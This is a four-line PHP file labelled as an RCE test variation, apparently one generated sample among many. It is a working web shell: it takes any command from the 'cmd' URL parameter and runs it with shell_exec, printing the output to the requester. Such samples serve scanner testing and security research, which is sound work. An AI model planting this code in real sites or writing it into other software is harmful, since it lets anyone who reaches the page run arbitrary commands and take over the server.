<?php
// RCE test variation #115
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>